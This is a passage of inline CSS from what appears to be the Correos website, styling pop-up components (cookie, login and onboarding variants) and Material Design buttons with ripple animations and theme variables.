		.sc-correos-cdk-pop-up-h .cdk-footer.sc-correos-cdk-pop-up>.cdk-footer-buttons.sc-correos-cdk-pop-up {
			display: -ms-flexbox;
			display: flex;
			-ms-flex-pack: end;
			justify-content: flex-end
		}

		.sc-correos-cdk-pop-up-h .cdk-footer.sc-correos-cdk-pop-up {
			margin: 16px;
			display: -ms-flexbox;
			display: flex;
			-ms-flex-pack: justify;
			justify-content: space-between
		}

		.sc-correos-cdk-pop-up-h .cdk-footer--center.sc-correos-cdk-pop-up {
			display: -ms-flexbox;
			display: flex;
			-ms-flex-pack: center;
			justify-content: center
		}

		.sc-correos-cdk-pop-up-h correos-ui-scroll-bar.sc-correos-cdk-pop-up {
			display: block
		}

		@media (min-width: 1024px) {
			[variant=cookies].sc-correos-cdk-pop-up-h .cdk-header.sc-correos-cdk-pop-up {
				margin: 40px;
				margin-bottom: 23px
			}
		}

		[variant=cookies].sc-correos-cdk-pop-up-h .cdk-footer.sc-correos-cdk-pop-up {
			-ms-flex-direction: column;
			flex-direction: column;
			padding: 16px 24px
		}

		[variant=cookies].sc-correos-cdk-pop-up-h .cdk-footer__info.sc-correos-cdk-pop-up {
			-ms-flex-align: center;
			align-items: center;
			padding-bottom: 24px;
			margin-right: 16px
		}

		@media (min-width: 1024px) {
			[variant=cookies].sc-correos-cdk-pop-up-h .cdk-footer__info.sc-correos-cdk-pop-up {
				padding-bottom: 0
			}
		}

		@media (min-width: 1024px) {
			[variant=cookies].sc-correos-cdk-pop-up-h .cdk-footer.sc-correos-cdk-pop-up {
				margin: 40px 40px;
				-ms-flex-direction: row;
				flex-direction: row;
				padding: 0
			}
		}

		.sc-correos-cdk-pop-up-h[variant=cookies] .sc-correos-cdk-pop-up-s>[slot=buttons] {
			-ms-flex-direction: column;
			flex-direction: column;
			display: block
		}

		@media (min-width: 640px) {
			.sc-correos-cdk-pop-up-h[variant=cookies] .sc-correos-cdk-pop-up-s>[slot=buttons] {
				-ms-flex-direction: column;
				flex-direction: column;
				display: block;
				margin: 0
			}
		}

		@media (min-width: 1024px) {
			.sc-correos-cdk-pop-up-h[variant=cookies] .sc-correos-cdk-pop-up-s>[slot=buttons] {
				-ms-flex-direction: row;
				flex-direction: row;
				display: -ms-inline-flexbox;
				display: inline-flex;
				width: -webkit-max-content;
				width: -moz-max-content;
				width: max-content
			}
		}

		[full-height=true].sc-correos-cdk-pop-up-h .cdk-modal.sc-correos-cdk-pop-up {
			height: 100%
		}

		[full-height=true].sc-correos-cdk-pop-up-h .cdk-content.sc-correos-cdk-pop-up {
			height: 100%;
			display: -ms-flexbox;
			display: flex;
			-ms-flex: 1;
			flex: 1;
			overflow: hidden
		}

		.sc-correos-cdk-pop-up-h[full-height=true] .sc-correos-cdk-pop-up-s>[slot=content] {
			display: -ms-flexbox;
			display: flex;
			-ms-flex: 1;
			flex: 1
		}

		[with-image=true].sc-correos-cdk-pop-up-h .cdk-modal.sc-correos-cdk-pop-up {
			display: -ms-flexbox;
			display: flex;
			-ms-flex-direction: row;
			flex-direction: row;
			max-height: 80%
		}

		[with-image=true].sc-correos-cdk-pop-up-h .cdk-modal.sc-correos-cdk-pop-up .cdk-image.sc-correos-cdk-pop-up {
			width: 40%;
			border: var(--_cdk-pop-up-border-modal);
			border-radius: 8px 0 0 8px;
			overflow: hidden
		}

		@media (max-width: 639px) {
			[with-image=true].sc-correos-cdk-pop-up-h .cdk-modal.sc-correos-cdk-pop-up .cdk-image.sc-correos-cdk-pop-up {
				display: none
			}
		}

		[with-image=true].sc-correos-cdk-pop-up-h .cdk-modal.sc-correos-cdk-pop-up .cdk-image.sc-correos-cdk-pop-up correos-cdk-imageblock.sc-correos-cdk-pop-up {
			border: var(--_cdk-pop-up-border-modal);
			border-radius: 8px 0 0 8px
		}

		[with-image=true].sc-correos-cdk-pop-up-h .cdk-modal.sc-correos-cdk-pop-up .cdk-modal-content.sc-correos-cdk-pop-up {
			width: 60%;
			display: -ms-flexbox;
			display: flex;
			max-height: 80%;
			min-height: 440px;
			-ms-flex-direction: column;
			flex-direction: column
		}

		@media (max-width: 639px) {
			[with-image=true].sc-correos-cdk-pop-up-h .cdk-modal.sc-correos-cdk-pop-up .cdk-modal-content.sc-correos-cdk-pop-up {
				width: 100%
			}
		}

		[with-image=true].sc-correos-cdk-pop-up-h .cdk-modal.sc-correos-cdk-pop-up .cdk-modal-content.sc-correos-cdk-pop-up .cdk-header.sc-correos-cdk-pop-up {
			border-bottom: none;
			-ms-flex-pack: end;
			justify-content: flex-end
		}

		[with-image=true].sc-correos-cdk-pop-up-h .cdk-modal.sc-correos-cdk-pop-up .cdk-modal-content.sc-correos-cdk-pop-up .cdk-content.sc-correos-cdk-pop-up {
			display: -ms-flexbox;
			display: flex;
			-ms-flex-pack: center;
			justify-content: center
		}

		[variant=login].sc-correos-cdk-pop-up-h .cdk-modal.sc-correos-cdk-pop-up {
			width: 100%
		}

		[variant=login].sc-correos-cdk-pop-up-h .cdk-modal.sc-correos-cdk-pop-up .cdk-image.sc-correos-cdk-pop-up {
			background-color: #f8f8f8
		}

		[variant=login].sc-correos-cdk-pop-up-h .cdk-modal.sc-correos-cdk-pop-up .cdk-image.sc-correos-cdk-pop-up correos-cdk-imageblock.sc-correos-cdk-pop-up {
			max-width: 340px;
			margin-left: auto;
			margin-right: auto
		}

		[variant=login].sc-correos-cdk-pop-up-h .cdk-modal.sc-correos-cdk-pop-up .cdk-modal-content.sc-correos-cdk-pop-up .cdk-header.sc-correos-cdk-pop-up {
			display: none;
			-ms-flex-pack: end;
			justify-content: flex-end
		}

		[variant=login].sc-correos-cdk-pop-up-h .cdk-modal.sc-correos-cdk-pop-up .cdk-modal-content.sc-correos-cdk-pop-up .cdk-content.sc-correos-cdk-pop-up {
			display: -ms-flexbox;
			display: flex;
			-ms-flex-pack: center;
			justify-content: center;
			margin: 0;
			padding: 40px
		}

		[variant=login].sc-correos-cdk-pop-up-h .cdk-modal.sc-correos-cdk-pop-up .cdk-modal-content.sc-correos-cdk-pop-up .cdk-footer.sc-correos-cdk-pop-up {
			display: none
		}

		.sc-correos-cdk-pop-up-h[variant=login] .sc-correos-cdk-pop-up-s>[slot=content] {
			padding-left: 0px;
			padding-right: 0px
		}

		[within-login=true].sc-correos-cdk-pop-up-h .cdk-modal.sc-correos-cdk-pop-up {
			display: -ms-flexbox;
			display: flex;
			-ms-flex-direction: column;
			flex-direction: column;
			max-height: 100%
		}

		[within-login=true].sc-correos-cdk-pop-up-h .cdk-modal.sc-correos-cdk-pop-up .cdk-modal-content.sc-correos-cdk-pop-up {
			width: 100%
		}

		[within-login=true].sc-correos-cdk-pop-up-h .cdk-modal.sc-correos-cdk-pop-up .cdk-modal-content.sc-correos-cdk-pop-up .cdk-header.sc-correos-cdk-pop-up {
			display: -ms-flexbox;
			display: flex;
			border-bottom: var(--_cdk-pop-up-border-title);
			-ms-flex-pack: justify;
			justify-content: space-between
		}

		[within-login=true].sc-correos-cdk-pop-up-h .cdk-modal.sc-correos-cdk-pop-up .cdk-modal-content.sc-correos-cdk-pop-up .cdk-content.sc-correos-cdk-pop-up {
			margin: 0 16px
		}

		@media (min-width: 640px) {
			[within-login=true].sc-correos-cdk-pop-up-h .cdk-modal.sc-correos-cdk-pop-up .cdk-modal-content.sc-correos-cdk-pop-up .cdk-content.sc-correos-cdk-pop-up {
				margin: 0 24px
			}
		}

		@media (min-width: 1024px) {
			[within-login=true].sc-correos-cdk-pop-up-h .cdk-modal.sc-correos-cdk-pop-up .cdk-modal-content.sc-correos-cdk-pop-up .cdk-content.sc-correos-cdk-pop-up {
				margin: 0 40px
			}
		}

		[within-login=true].sc-correos-cdk-pop-up-h .cdk-modal.sc-correos-cdk-pop-up .cdk-modal-content.sc-correos-cdk-pop-up .cdk-footer.sc-correos-cdk-pop-up {
			display: -ms-flexbox;
			display: flex
		}

		.sc-correos-cdk-pop-up-h[within-login=true] .sc-correos-cdk-pop-up-s>[slot=content] {
			width: 100%;
			padding-bottom: 24px
		}

		[variant=custom-select].sc-correos-cdk-pop-up-h .cdk-modal.sc-correos-cdk-pop-up .cdk-content.sc-correos-cdk-pop-up {
			min-height: 320px
		}

		[variant=onboarding].sc-correos-cdk-pop-up-h .cdk-modal.sc-correos-cdk-pop-up {
			max-height: 60%
		}
	</style>
	<style>
		#cartype>li {
			margin-top: 6px;
			margin-bottom: 6px;
		}

		#corefooter>li {
			font-size: 9px;
		}
	</style>
	<style>
		.mdc-touch-target-wrapper.sc-correos-ui-button {
			display: inline
		}

		.mdc-button.sc-correos-ui-button {
			font-family: Roboto, sans-serif;
			-moz-osx-font-smoothing: grayscale;
			-webkit-font-smoothing: antialiased;
			font-size: 0.875rem;
			line-height: 2.25rem;
			font-weight: 500;
			letter-spacing: 0.0892857143em;
			text-decoration: none;
			text-transform: uppercase;
			padding: 0 8px 0 8px;
			display: -ms-inline-flexbox;
			display: inline-flex;
			position: relative;
			-ms-flex-align: center;
			align-items: center;
			-ms-flex-pack: center;
			justify-content: center;
			-webkit-box-sizing: border-box;
			box-sizing: border-box;
			min-width: 64px;
			border: none;
			outline: none;
			line-height: inherit;
			-webkit-user-select: none;
			-moz-user-select: none;
			-ms-user-select: none;
			user-select: none;
			-webkit-appearance: none;
			overflow: visible;
			vertical-align: middle;
			border-radius: 4px
		}

		.mdc-button.sc-correos-ui-button::-moz-focus-inner {
			padding: 0;
			border: 0
		}

		.mdc-button.sc-correos-ui-button:active {
			outline: none
		}

		.mdc-button.sc-correos-ui-button:hover {
			cursor: pointer
		}

		.mdc-button.sc-correos-ui-button:disabled {
			background-color: transparent;
			color: rgba(0, 0, 0, 0.37);
			cursor: default;
			pointer-events: none
		}

		.mdc-button.sc-correos-ui-button .mdc-button__ripple.sc-correos-ui-button {
			border-radius: 4px
		}

		.mdc-button.sc-correos-ui-button:not(:disabled) {
			background-color: transparent
		}

		.mdc-button.sc-correos-ui-button .mdc-button__icon.sc-correos-ui-button {
			margin-left: 0;
			margin-right: 8px;
			display: inline-block;
			width: 18px;
			height: 18px;
			font-size: 18px;
			vertical-align: top
		}

		[dir=rtl].sc-correos-ui-button .mdc-button.sc-correos-ui-button .mdc-button__icon.sc-correos-ui-button,
		.mdc-button.sc-correos-ui-button .mdc-button__icon[dir=rtl].sc-correos-ui-button {
			margin-left: 8px;
			margin-right: 0
		}

		.mdc-button.sc-correos-ui-button .mdc-button__touch.sc-correos-ui-button {
			position: absolute;
			top: 50%;
			right: 0;
			left: 0;
			height: 48px;
			-webkit-transform: translateY(-50%);
			transform: translateY(-50%)
		}

		.mdc-button.sc-correos-ui-button:not(:disabled) {
			color: #6200ee;
			color: var(--mdc-theme-primary, #6200ee)
		}

		.mdc-button__label.sc-correos-ui-button+.mdc-button__icon.sc-correos-ui-button {
			margin-left: 8px;
			margin-right: 0
		}

		[dir=rtl].sc-correos-ui-button .mdc-button__label.sc-correos-ui-button+.mdc-button__icon.sc-correos-ui-button,
		.mdc-button__label.sc-correos-ui-button+.mdc-button__icon[dir=rtl].sc-correos-ui-button {
			margin-left: 0;
			margin-right: 8px
		}

		svg.mdc-button__icon.sc-correos-ui-button {
			fill: currentColor
		}

		.mdc-button--raised.sc-correos-ui-button .mdc-button__icon.sc-correos-ui-button,
		.mdc-button--unelevated.sc-correos-ui-button .mdc-button__icon.sc-correos-ui-button,
		.mdc-button--outlined.sc-correos-ui-button .mdc-button__icon.sc-correos-ui-button {
			margin-left: -4px;
			margin-right: 8px
		}

		[dir=rtl].sc-correos-ui-button .mdc-button--raised.sc-correos-ui-button .mdc-button__icon.sc-correos-ui-button,
		.mdc-button--raised.sc-correos-ui-button .mdc-button__icon[dir=rtl].sc-correos-ui-button,
		[dir=rtl].sc-correos-ui-button .mdc-button--unelevated.sc-correos-ui-button .mdc-button__icon.sc-correos-ui-button,
		.mdc-button--unelevated.sc-correos-ui-button .mdc-button__icon[dir=rtl].sc-correos-ui-button,
		[dir=rtl].sc-correos-ui-button .mdc-button--outlined.sc-correos-ui-button .mdc-button__icon.sc-correos-ui-button,
		.mdc-button--outlined.sc-correos-ui-button .mdc-button__icon[dir=rtl].sc-correos-ui-button {
			margin-left: 8px;
			margin-right: -4px
		}

		.mdc-button--raised.sc-correos-ui-button .mdc-button__label.sc-correos-ui-button+.mdc-button__icon.sc-correos-ui-button,
		.mdc-button--unelevated.sc-correos-ui-button .mdc-button__label.sc-correos-ui-button+.mdc-button__icon.sc-correos-ui-button,
		.mdc-button--outlined.sc-correos-ui-button .mdc-button__label.sc-correos-ui-button+.mdc-button__icon.sc-correos-ui-button {
			margin-left: 8px;
			margin-right: -4px
		}

		[dir=rtl].sc-correos-ui-button .mdc-button--raised.sc-correos-ui-button .mdc-button__label.sc-correos-ui-button+.mdc-button__icon.sc-correos-ui-button,
		.mdc-button--raised.sc-correos-ui-button .mdc-button__label.sc-correos-ui-button+.mdc-button__icon[dir=rtl].sc-correos-ui-button,
		[dir=rtl].sc-correos-ui-button .mdc-button--unelevated.sc-correos-ui-button .mdc-button__label.sc-correos-ui-button+.mdc-button__icon.sc-correos-ui-button,
		.mdc-button--unelevated.sc-correos-ui-button .mdc-button__label.sc-correos-ui-button+.mdc-button__icon[dir=rtl].sc-correos-ui-button,
		[dir=rtl].sc-correos-ui-button .mdc-button--outlined.sc-correos-ui-button .mdc-button__label.sc-correos-ui-button+.mdc-button__icon.sc-correos-ui-button,
		.mdc-button--outlined.sc-correos-ui-button .mdc-button__label.sc-correos-ui-button+.mdc-button__icon[dir=rtl].sc-correos-ui-button {
			margin-left: -4px;
			margin-right: 8px
		}

		.mdc-button--raised.sc-correos-ui-button,
		.mdc-button--unelevated.sc-correos-ui-button {
			padding: 0 16px 0 16px
		}

		.mdc-button--raised.sc-correos-ui-button:disabled,
		.mdc-button--unelevated.sc-correos-ui-button:disabled {
			background-color: rgba(0, 0, 0, 0.12);
			color: rgba(0, 0, 0, 0.37)
		}

		.mdc-button--raised.sc-correos-ui-button:not(:disabled),
		.mdc-button--unelevated.sc-correos-ui-button:not(:disabled) {
			background-color: #6200ee
		}

		@supports not (-ms-ime-align: auto) {

			.mdc-button--raised.sc-correos-ui-button:not(:disabled),
			.mdc-button--unelevated.sc-correos-ui-button:not(:disabled) {
				background-color: var(--mdc-theme-primary, #6200ee)
			}
		}

		.mdc-button--raised.sc-correos-ui-button:not(:disabled),
		.mdc-button--unelevated.sc-correos-ui-button:not(:disabled) {
			color: #fff;
			color: var(--mdc-theme-on-primary, #fff)
		}

		.mdc-button--raised.sc-correos-ui-button {
			-webkit-box-shadow: 0px 3px 1px -2px rgba(0, 0, 0, 0.2), 0px 2px 2px 0px rgba(0, 0, 0, 0.14), 0px 1px 5px 0px rgba(0, 0, 0, 0.12);
			box-shadow: 0px 3px 1px -2px rgba(0, 0, 0, 0.2), 0px 2px 2px 0px rgba(0, 0, 0, 0.14), 0px 1px 5px 0px rgba(0, 0, 0, 0.12);
			-webkit-transition: -webkit-box-shadow 280ms cubic-bezier(0.4, 0, 0.2, 1);
			transition: -webkit-box-shadow 280ms cubic-bezier(0.4, 0, 0.2, 1);
			transition: box-shadow 280ms cubic-bezier(0.4, 0, 0.2, 1);
			transition: box-shadow 280ms cubic-bezier(0.4, 0, 0.2, 1), -webkit-box-shadow 280ms cubic-bezier(0.4, 0, 0.2, 1)
		}

		.mdc-button--raised.sc-correos-ui-button:hover,
		.mdc-button--raised.sc-correos-ui-button:focus {
			-webkit-box-shadow: 0px 2px 4px -1px rgba(0, 0, 0, 0.2), 0px 4px 5px 0px rgba(0, 0, 0, 0.14), 0px 1px 10px 0px rgba(0, 0, 0, 0.12);
			box-shadow: 0px 2px 4px -1px rgba(0, 0, 0, 0.2), 0px 4px 5px 0px rgba(0, 0, 0, 0.14), 0px 1px 10px 0px rgba(0, 0, 0, 0.12)
		}

		.mdc-button--raised.sc-correos-ui-button:active {
			-webkit-box-shadow: 0px 5px 5px -3px rgba(0, 0, 0, 0.2), 0px 8px 10px 1px rgba(0, 0, 0, 0.14), 0px 3px 14px 2px rgba(0, 0, 0, 0.12);
			box-shadow: 0px 5px 5px -3px rgba(0, 0, 0, 0.2), 0px 8px 10px 1px rgba(0, 0, 0, 0.14), 0px 3px 14px 2px rgba(0, 0, 0, 0.12)
		}

		.mdc-button--raised.sc-correos-ui-button:disabled {
			-webkit-box-shadow: 0px 0px 0px 0px rgba(0, 0, 0, 0.2), 0px 0px 0px 0px rgba(0, 0, 0, 0.14), 0px 0px 0px 0px rgba(0, 0, 0, 0.12);
			box-shadow: 0px 0px 0px 0px rgba(0, 0, 0, 0.2), 0px 0px 0px 0px rgba(0, 0, 0, 0.14), 0px 0px 0px 0px rgba(0, 0, 0, 0.12)
		}

		.mdc-button--outlined.sc-correos-ui-button {
			border-style: solid;
			padding: 0 15px 0 15px;
			border-width: 1px
		}

		.mdc-button--outlined.sc-correos-ui-button:disabled {
			border-color: rgba(0, 0, 0, 0.37)
		}

		.mdc-button--outlined.sc-correos-ui-button .mdc-button__ripple.sc-correos-ui-button {
			top: -1px;
			left: -1px;
			border: 1px solid transparent
		}

		.mdc-button--outlined.sc-correos-ui-button:not(:disabled) {
			border-color: #6200ee;
			border-color: var(--mdc-theme-primary, #6200ee)
		}

		.mdc-button--touch.sc-correos-ui-button {
			margin-top: 6px;
			margin-bottom: 6px
		}

		@-webkit-keyframes mdc-ripple-fg-radius-in {
			from {
				-webkit-animation-timing-function: cubic-bezier(0.4, 0, 0.2, 1);
				animation-timing-function: cubic-bezier(0.4, 0, 0.2, 1);
				-webkit-transform: translate(var(--mdc-ripple-fg-translate-start, 0)) scale(1);
				transform: translate(var(--mdc-ripple-fg-translate-start, 0)) scale(1)
			}

			to {
				-webkit-transform: translate(var(--mdc-ripple-fg-translate-end, 0)) scale(var(--mdc-ripple-fg-scale, 1));
				transform: translate(var(--mdc-ripple-fg-translate-end, 0)) scale(var(--mdc-ripple-fg-scale, 1))
			}
		}

		@keyframes mdc-ripple-fg-radius-in {
			from {
				-webkit-animation-timing-function: cubic-bezier(0.4, 0, 0.2, 1);
				animation-timing-function: cubic-bezier(0.4, 0, 0.2, 1);
				-webkit-transform: translate(var(--mdc-ripple-fg-translate-start, 0)) scale(1);
				transform: translate(var(--mdc-ripple-fg-translate-start, 0)) scale(1)
			}

			to {
				-webkit-transform: translate(var(--mdc-ripple-fg-translate-end, 0)) scale(var(--mdc-ripple-fg-scale, 1));
				transform: translate(var(--mdc-ripple-fg-translate-end, 0)) scale(var(--mdc-ripple-fg-scale, 1))
			}
		}

		@-webkit-keyframes mdc-ripple-fg-opacity-in {
			from {
				-webkit-animation-timing-function: linear;
				animation-timing-function: linear;
				opacity: 0
			}

			to {
				opacity: var(--mdc-ripple-fg-opacity, 0)
			}
		}

		@keyframes mdc-ripple-fg-opacity-in {
			from {
				-webkit-animation-timing-function: linear;
				animation-timing-function: linear;
				opacity: 0
			}

			to {
				opacity: var(--mdc-ripple-fg-opacity, 0)
			}
		}

		@-webkit-keyframes mdc-ripple-fg-opacity-out {
			from {
				-webkit-animation-timing-function: linear;
				animation-timing-function: linear;
				opacity: var(--mdc-ripple-fg-opacity, 0)
			}

			to {
				opacity: 0
			}
		}

		@keyframes mdc-ripple-fg-opacity-out {
			from {
				-webkit-animation-timing-function: linear;
				animation-timing-function: linear;
				opacity: var(--mdc-ripple-fg-opacity, 0)
			}

			to {
				opacity: 0
			}
		}

		.mdc-ripple-surface--test-edge-var-bug.sc-correos-ui-button {
			--mdc-ripple-surface-test-edge-var: 1px solid #000;
			visibility: hidden
		}

		.mdc-ripple-surface--test-edge-var-bug.sc-correos-ui-button::before {
			border: var(--mdc-ripple-surface-test-edge-var)
		}

		.mdc-button.sc-correos-ui-button {
			--mdc-ripple-fg-size: 0;
			--mdc-ripple-left: 0;
			--mdc-ripple-top: 0;
			--mdc-ripple-fg-scale: 1;
			--mdc-ripple-fg-translate-end: 0;
			--mdc-ripple-fg-translate-start: 0;
			-webkit-tap-highlight-color: rgba(0, 0, 0, 0)
		}

		.mdc-button.sc-correos-ui-button .mdc-button__ripple.sc-correos-ui-button::before,
		.mdc-button.sc-correos-ui-button .mdc-button__ripple.sc-correos-ui-button::after {
			position: absolute;
			border-radius: 50%;
			opacity: 0;
			pointer-events: none;
			content: ""
		}

		.mdc-button.sc-correos-ui-button .mdc-button__ripple.sc-correos-ui-button::before {
			-webkit-transition: opacity 15ms linear, background-color 15ms linear;
			transition: opacity 15ms linear, background-color 15ms linear;
			z-index: 1
		}

		.mdc-button.mdc-ripple-upgraded.sc-correos-ui-button .mdc-button__ripple.sc-correos-ui-button::before {
			-webkit-transform: scale(var(--mdc-ripple-fg-scale, 1));
			transform: scale(var(--mdc-ripple-fg-scale, 1))
		}

		.mdc-button.mdc-ripple-upgraded.sc-correos-ui-button .mdc-button__ripple.sc-correos-ui-button::after {
			top: 0;
			left: 0;
			-webkit-transform: scale(0);
			transform: scale(0);
			-webkit-transform-origin: center center;
			transform-origin: center center
		}

		.mdc-button.mdc-ripple-upgraded--unbounded.sc-correos-ui-button .mdc-button__ripple.sc-correos-ui-button::after {
			top: var(--mdc-ripple-top, 0);
			left: var(--mdc-ripple-left, 0)
		}

		.mdc-button.mdc-ripple-upgraded--foreground-activation.sc-correos-ui-button .mdc-button__ripple.sc-correos-ui-button::after {
			-webkit-animation: mdc-ripple-fg-radius-in 225ms forwards, mdc-ripple-fg-opacity-in 75ms forwards;
			animation: mdc-ripple-fg-radius-in 225ms forwards, mdc-ripple-fg-opacity-in 75ms forwards
		}

		.mdc-button.mdc-ripple-upgraded--foreground-deactivation.sc-correos-ui-button .mdc-button__ripple.sc-correos-ui-button::after {
			-webkit-animation: mdc-ripple-fg-opacity-out 150ms;
			animation: mdc-ripple-fg-opacity-out 150ms;
			-webkit-transform: translate(var(--mdc-ripple-fg-translate-end, 0)) scale(var(--mdc-ripple-fg-scale, 1));
			transform: translate(var(--mdc-ripple-fg-translate-end, 0)) scale(var(--mdc-ripple-fg-scale, 1))
		}

		.mdc-button.sc-correos-ui-button .mdc-button__ripple.sc-correos-ui-button::before,
		.mdc-button.sc-correos-ui-button .mdc-button__ripple.sc-correos-ui-button::after {
			top: calc(50% - 100%);
			left: calc(50% - 100%);
			width: 200%;
			height: 200%
		}

		.mdc-button.mdc-ripple-upgraded.sc-correos-ui-button .mdc-button__ripple.sc-correos-ui-button::after {
			width: var(--mdc-ripple-fg-size, 100%);
			height: var(--mdc-ripple-fg-size, 100%)
		}

		.mdc-button.sc-correos-ui-button .mdc-button__ripple.sc-correos-ui-button::before,
		.mdc-button.sc-correos-ui-button .mdc-button__ripple.sc-correos-ui-button::after {
			background-color: #6200ee
		}

		@supports not (-ms-ime-align: auto) {

			.mdc-button.sc-correos-ui-button .mdc-button__ripple.sc-correos-ui-button::before,
			.mdc-button.sc-correos-ui-button .mdc-button__ripple.sc-correos-ui-button::after {
				background-color: var(--mdc-theme-primary, #6200ee)
			}
		}

		.mdc-button.sc-correos-ui-button:hover .mdc-button__ripple.sc-correos-ui-button::before {
			opacity: 0.04
		}

		.mdc-button.mdc-ripple-upgraded--background-focused.sc-correos-ui-button .mdc-button__ripple.sc-correos-ui-button::before,
		.mdc-button.sc-correos-ui-button:not(.mdc-ripple-upgraded):focus .mdc-button__ripple.sc-correos-ui-button::before {
			-webkit-transition-duration: 75ms;
			transition-duration: 75ms;
			opacity: 0.12
		}

		.mdc-button.sc-correos-ui-button:not(.mdc-ripple-upgraded) .mdc-button__ripple.sc-correos-ui-button::after {
			-webkit-transition: opacity 150ms linear;
			transition: opacity 150ms linear
		}

		.mdc-button.sc-correos-ui-button:not(.mdc-ripple-upgraded):active .mdc-button__ripple.sc-correos-ui-button::after {
			-webkit-transition-duration: 75ms;
			transition-duration: 75ms;
			opacity: 0.12
		}

		.mdc-button.mdc-ripple-upgraded.sc-correos-ui-button {
			--mdc-ripple-fg-opacity: 0.12
		}

		.mdc-button.sc-correos-ui-button .mdc-button__ripple.sc-correos-ui-button {
			position: absolute;
			-webkit-box-sizing: content-box;
			box-sizing: content-box;
			width: 100%;
			height: 100%;
			overflow: hidden
		}

		.mdc-button.sc-correos-ui-button:not(.mdc-button--outlined) .mdc-button__ripple.sc-correos-ui-button {
			top: 0;
			left: 0
		}

		.mdc-button--raised.sc-correos-ui-button .mdc-button__ripple.sc-correos-ui-button::before,
		.mdc-button--raised.sc-correos-ui-button .mdc-button__ripple.sc-correos-ui-button::after,
		.mdc-button--unelevated.sc-correos-ui-button .mdc-button__ripple.sc-correos-ui-button::before,
		.mdc-button--unelevated.sc-correos-ui-button .mdc-button__ripple.sc-correos-ui-button::after {
			background-color: #fff
		}

		@supports not (-ms-ime-align: auto) {

			.mdc-button--raised.sc-correos-ui-button .mdc-button__ripple.sc-correos-ui-button::before,
			.mdc-button--raised.sc-correos-ui-button .mdc-button__ripple.sc-correos-ui-button::after,
			.mdc-button--unelevated.sc-correos-ui-button .mdc-button__ripple.sc-correos-ui-button::before,
			.mdc-button--unelevated.sc-correos-ui-button .mdc-button__ripple.sc-correos-ui-button::after {
				background-color: var(--mdc-theme-on-primary, #fff)
			}
		}

		.mdc-button--raised.sc-correos-ui-button:hover .mdc-button__ripple.sc-correos-ui-button::before,
		.mdc-button--unelevated.sc-correos-ui-button:hover .mdc-button__ripple.sc-correos-ui-button::before {
			opacity: 0.08
		}

		.mdc-button--raised.mdc-ripple-upgraded--background-focused.sc-correos-ui-button .mdc-button__ripple.sc-correos-ui-button::before,
		.mdc-button--raised.sc-correos-ui-button:not(.mdc-ripple-upgraded):focus .mdc-button__ripple.sc-correos-ui-button::before,
		.mdc-button--unelevated.mdc-ripple-upgraded--background-focused.sc-correos-ui-button .mdc-button__ripple.sc-correos-ui-button::before,
		.mdc-button--unelevated.sc-correos-ui-button:not(.mdc-ripple-upgraded):focus .mdc-button__ripple.sc-correos-ui-button::before {
			-webkit-transition-duration: 75ms;
			transition-duration: 75ms;
			opacity: 0.24
		}

		.mdc-button--raised.sc-correos-ui-button:not(.mdc-ripple-upgraded) .mdc-button__ripple.sc-correos-ui-button::after,
		.mdc-button--unelevated.sc-correos-ui-button:not(.mdc-ripple-upgraded) .mdc-button__ripple.sc-correos-ui-button::after {
			-webkit-transition: opacity 150ms linear;
			transition: opacity 150ms linear
		}

		.mdc-button--raised.sc-correos-ui-button:not(.mdc-ripple-upgraded):active .mdc-button__ripple.sc-correos-ui-button::after,
		.mdc-button--unelevated.sc-correos-ui-button:not(.mdc-ripple-upgraded):active .mdc-button__ripple.sc-correos-ui-button::after {
			-webkit-transition-duration: 75ms;
			transition-duration: 75ms;
			opacity: 0.24
		}

		.mdc-button--raised.mdc-ripple-upgraded.sc-correos-ui-button,
		.mdc-button--unelevated.mdc-ripple-upgraded.sc-correos-ui-button {
			--mdc-ripple-fg-opacity: 0.24
		}

		.mdc-button.sc-correos-ui-button {
			height: 36px
		}

		.sc-correos-ui-button-h {
			--_ui-button-font-family: var(--ui-button-font-family, sans-serif);
			--_ui-button-min-width: var(--ui-button-min-width, 12rem);
			--_ui-button-border-radius: var(--ui-button-border-radius, 8px);
			--_ui-button-bg-color: var(--ui-button-bg-color, magenta);
			--_ui-button-bg-color-disabled: var(--ui-button-bg-color-disabled, gray);
			--_ui-button-bg-color-hover: var(--ui-button-bg-color-hover, green);
			--_ui-button-text-color: var(--ui-button-text-color, white);
			--_ui-button-color: var(--ui-button-color, #002e6d);
			--_ui-button-border-color: var(--ui-button-border-color, transparent);
			--_ui-button-border-color-disabled: var(--ui-button-border-color-disabled, none);
			--_ui-button-border: var(--ui-button-border, transparent);
			--_ui-button-text-color-hover: var(--ui-button-text-color-hover, red)
		}

		[theme=primary].sc-correos-ui-button-h {
			--_ui-button-bg-color: var(--ui-button-primary-bg-color);
			--_ui-button-bg-color-disabled: var(--ui-button-primary-bg-color-disabled);
			--_ui-button-bg-color-hover: var(--ui-button-primary-bg-color-hover);
			--_ui-button-text-color: var(--ui-button-primary-text-color);
			--_ui-button-border-color: var(--ui-button-primary-border-color);
			--_ui-button-border: var(--ui-button-primary-border);
			--_ui-button-border-color-disabled: var(--ui-button-primary-border-color-disabled)
		}

		[theme=secondary].sc-correos-ui-button-h {
			--_ui-button-bg-color: var(--ui-button-secondary-bg-color);
			--_ui-button-bg-color-disabled: var(--ui-button-secondary-bg-color-disabled);
			--_ui-button-bg-color-hover: var(--ui-button-secondary-bg-color-hover);
			--_ui-button-text-color: var(--ui-button-secondary-text-color);
			--_ui-button-border-color: var(--ui-button-secondary-border-color);
			--_ui-button-border: var(--ui-button-secondary-border);
			--_ui-button-border-color-disabled: var(--ui-button-secondary-border-color-disabled)
		}

		[theme=tertiary].sc-correos-ui-button-h {
			--_ui-button-bg-color: var(--ui-button-tertiary-bg-color);
			--_ui-button-bg-color-disabled: var(--ui-button-tertiary-bg-color-disabled);
			--_ui-button-bg-color-hover: var(--ui-button-tertiary-bg-color-hover);
			--_ui-button-text-color: var(--ui-button-tertiary-text-color);
			--_ui-button-border-color: var(--ui-button-tertiary-border-color);
			--_ui-button-border: var(--ui-button-tertiary-border);
			--_ui-button-border-color-disabled: var(--ui-button-tertiary-border-color-disabled)
		}

		[theme=ghost].sc-correos-ui-button-h {
			--_ui-button-bg-color: var(--ui-button-ghost-bg-color);
			--_ui-button-bg-color-disabled: var(--ui-button-ghost-bg-color-disabled);
			--_ui-button-bg-color-hover: var(--ui-button-ghost-bg-color-hover);
			--_ui-button-text-color: var(--ui-button-ghost-text-color);
			--_ui-button-border-color: var(--ui-button-ghost-border-color);
			--_ui-button-border: var(--ui-button-ghost-border);
			--_ui-button-border-color-disabled: var(--ui-button-ghost-border-color-disabled)
		}

		[theme=default][variant=link].sc-correos-ui-button-h,
